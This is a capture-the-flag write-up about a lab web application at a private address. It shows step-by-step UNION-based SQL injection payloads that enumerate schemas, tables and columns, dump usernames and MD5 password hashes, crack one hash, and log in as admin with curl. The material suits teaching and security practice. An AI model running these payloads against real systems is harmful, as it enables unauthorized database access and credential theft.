# SignIn Page

__http://192.168.56.101/index.php?page=signin__

## Description
This page show sign in form with username and password fields.

## Form Outputs
The [page](#http://192.168.56.101/?page=member&id=42%20union%20select%20column_name,%20column_type%20from%20information_schema.columns%20where%20table_schema=database()&Submit=Submit) return the list of members
We should use injections again
[select schema_name, 0 from information_schema.schemata](#http://192.168.56.101/index.php?page=member&id=-1%20union%20select%20schema_name,%200%20from%20information_schema.schemata&Submit=Submit)
```
ID: -1 union select schema_name, 0 from information_schema.schemata 
First name: information_schema
Surname : 0
ID: -1 union select schema_name, 0 from information_schema.schemata 
First name: Member_Brute_Force
Surname : 0
ID: -1 union select schema_name, 0 from information_schema.schemata 
First name: Member_Sql_Injection
Surname : 0
ID: -1 union select schema_name, 0 from information_schema.schemata 
First name: Member_guestbook
Surname : 0
ID: -1 union select schema_name, 0 from information_schema.schemata 
First name: Member_images
Surname : 0
ID: -1 union select schema_name, 0 from information_schema.schemata 
First name: Member_survey
Surname : 0
```
We get the following schemas:
1. information_schema
2. Member_Brute_Force
3. Member_Sql_Injection
4. Member_guestbook
5. Member_images
6. Member_survey

We need all tables of schema Member_Brute_Force and all columns.
Firstly we need ASCII orders of the Member_Brute_Force chars

``` python -c 'print([ord(c) for c in "Member_Brute_Force"]);'       
[77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101]
``` 
instead of using in select where table_schema='Member_Brute_Force'

we will request [select table_name,0 from information_schema.tables where table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101)](#http://192.168.56.101/index.php?page=member&id=-1%20union%20select%20table_name,0%20from%20information_schema.tables%20where%20table_schema=CHAR(77,%20101,%20109,%2098,%20101,%20114,%2095,%2066,%20114,%20117,%20116,%20101,%2095,%2070,%20111,%20114,%2099,%20101)&Submit=Submit)

we get the page with database db_default
```
ID: -1 union select table_name,0 from information_schema.tables where table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101) 
First name: db_default
Surname : 0
```
[select column_name,0 from information_schema.columns where table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101)](#http://192.168.56.101/index.php?page=member&id=-1%20union%20select%20column_name,0%20from%20information_schema.columns%20where%20table_schema=CHAR(77,%20101,%20109,%2098,%20101,%20114,%2095,%2066,%20114,%20117,%20116,%20101,%2095,%2070,%20111,%20114,%2099,%20101)&Submit=Submit)
```
ID: -1 union select column_name,0 from information_schema.columns where table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101) 
First name: id
Surname : 0
ID: -1 union select column_name,0 from information_schema.columns where table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101) 
First name: username
Surname : 0
ID: -1 union select column_name,0 from information_schema.columns where table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101) 
First name: password
Surname : 0
```
we get columns:
1. id
2. username
3. password

Let's check users [select username, password from Member_Brute_Force.db_default&Submit=Submit](#http://192.168.56.101/index.php?page=member&id=-1%20union%20select%20username,%20password%20from%20Member_Brute_Force.db_default&Submit=Submit)

```
ID: -1 union select username, password from Member_Brute_Force.db_default 
First name: root
Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
ID: -1 union select username, password from Member_Brute_Force.db_default 
First name: admin
Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
```
Surname is the same. Let's use the info

## Flag
The flag we've got is [shadow](#https://md5.gromweb.com/?md5=3bf1114a986ba87ed28fc1b5884fc2f8)

```
curl -s 'http://192.168.56.101/index.php?page=signin&username=admin&password=dummy&Login=Login' -o dummy.html
curl -s 'http://192.168.56.101/index.php?page=signin&username=admin&password=shadow&Login=Login' -o admin.html
diff admin.html dummy.html 
```
Inside the diff output html we get the flag


## Safety
Through this exercise, the importance of secure coding practices, input validation, and access control is highlighted. It emphasizes the need to sanitize user input and use proper authentication mechanisms to prevent SQL injection attacks.